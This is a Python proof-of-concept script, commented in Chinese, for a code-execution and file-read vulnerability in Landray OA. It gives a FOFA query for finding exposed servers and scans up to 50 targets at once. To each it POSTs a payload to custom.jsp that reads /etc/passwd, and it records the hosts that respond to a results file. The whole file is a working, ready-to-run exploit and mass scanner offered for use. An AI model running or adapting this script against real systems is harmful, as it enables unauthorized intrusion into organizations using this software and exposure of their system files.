# 蓝凌OA前台代码执行
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# icon_hash="831854882" && "landray.com.cn"

def banner():
    test = """
 ██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝

                               
 """
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='蓝凌OA前台代码执行漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_payload = "/sys/ui/extend/varkind/custom.jsp"
    headers={
		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
		"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
		"Accept-Encoding":"gzip, deflate",
		"Connection":"close",
		"Cookie":"JSESSIONID=EA419896062AC4B6FE325FF08B8AF36E",
		"Upgrade-Insecure-Requests":"1",
		"Content-Type":"application/x-www-form-urlencoded",
		"Content-Length":"44"
	}
    data="var={\"body\":{\"file\":\"file:///etc/passwd\"}}"

    try:
        res = requests.get(url=target,verify=False)
        res1 = requests.post(url=target+api_payload,headers=headers,data=data,verify=False)
        if res.status_code == 200:
            if res1.status_code == 200 and "root" in res1.text:
                print(f"[+]{target} 存在代码执行漏洞")
                with open('result.txt','a') as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]{target} 不存在代码执行漏洞")
        else:
            print(f"[-]{target} 不存在代码执行漏洞")
    except:
         print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()